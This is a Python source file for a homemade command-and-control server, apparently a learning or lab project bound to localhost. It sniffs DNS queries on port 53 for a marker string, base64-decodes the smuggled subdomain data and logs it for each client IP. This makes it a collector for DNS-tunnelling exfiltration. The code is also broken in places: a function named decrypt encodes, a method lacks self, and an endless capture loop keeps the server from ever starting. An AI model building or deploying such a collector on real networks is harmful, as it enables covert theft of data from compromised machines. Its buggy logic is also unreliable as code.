import socketserver
from pathlib import Path
from datetime import datetime
import os
import base64
import pyshark

class clientcon(socketserver.StreamRequestHandler):
    def handle(self):
        now = datetime.now()
        time = str(now.strftime("%H:%M:%S"))
        data = decrypt(self.rfile.readline().strip())
        user = self.client_address[0]
        print("Recieved one request from {}".format(self.client_address[0])," @ ", time)
        savedata(data,user)
        return

    def send(data):
        self.wfile.write(data.encode())
        print(f"Sent {data} to client")


class server():

    def svr_start(host,port):
        aServer = socketserver.TCPServer((host, port), clientcon)
        print(f"Listening at {host} on port {port}")
        aServer.serve_forever()

host = "127.0.0.1"
port = 53
C2NAME = "Elliott's awesome C2 server"
IDENTIFIER_STRING = ".pineapple."
DOMAIN = "localhost"


def init():

    print(f"Starting {C2NAME}")
    server.svr_start(host,port)

def savedata(data,user):
    if data is not None:
        print(f"Received: {data}")
        f = open(Path(f'./{user.replace(".","")}.log'), "a")
        f.write(str(data)+"\n")
        f.close()

def decrypt(data):
    print(f"Decrypting {data}")
    data = base64.b64encode(data).decode("ascii")
    print(data)
    return data

def dnscap():
    cap = pyshark.LiveCapture(interface="lo", bpf_filter='udp port 53')
    while True:
        cap.sniff(timeout=1)
        for packet in cap.sniff_continuously(packet_count=5):
            if IDENTIFIER_STRING in packet.dns.qry_name:
                data = packet.dns.qry_name
                print("DNS REQUEST: ",data)
                data = dnsformat(data)
                user = packet.ip.src
                savedata(data,user)
        pass

def dnsformat(data):
    data = data.strip()
    data = data.replace(IDENTIFIER_STRING+DOMAIN, "")
    print("DNS STRIP:",data)
    data = base64.b64decode(data)
    print("DECODED DNS REQUEST: ",data)
    return data

dnscap()


init()
